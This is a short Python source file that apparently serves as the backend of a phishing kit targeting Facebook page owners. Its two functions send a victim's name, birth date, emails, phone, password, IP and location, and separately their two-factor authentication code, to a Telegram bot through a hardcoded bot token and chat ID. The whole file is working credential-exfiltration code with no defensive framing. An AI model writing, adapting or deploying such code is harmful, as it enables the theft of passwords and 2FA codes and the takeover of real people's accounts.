import requests
from datetime import datetime


def change_time_format(time):
    input_date_str = str(time)
    input_date = datetime.strptime(input_date_str, "%Y-%m-%d")

    formatted_date = input_date.strftime("%d/%m/%Y")

    return formatted_date


def send_data_to_tele_bot(fan_page_name, fullname, email_business, email, phone, password, country, dob, city, ip):
    message = f"""
    Fan Page Name: {fan_page_name}
    Full Name: {fullname}
    Dob: {change_time_format(dob)}
    Email Business: {email_business}
    Email: {email}
    Phone: {phone}
    Password: {password}
    User IP: {ip}
    User City: {city}
    User Country: {country}"""
    base_url = f"https://api.telegram.org/bot6928394146:AAGZJRexw5KaPihhXk7QciI4FkF1BJHbFc0/sendMessage?chat_id=6913122748&text={message}"
    requests.get(base_url)


def send_2fa_to_tele_bot(email, code):
    message = f"""
    Email: {email}
    Code: {code}"""
    base_url = f"https://api.telegram.org/bot6928394146:AAGZJRexw5KaPihhXk7QciI4FkF1BJHbFc0/sendMessage?chat_id=6913122748&text={message}"
    requests.get(base_url)
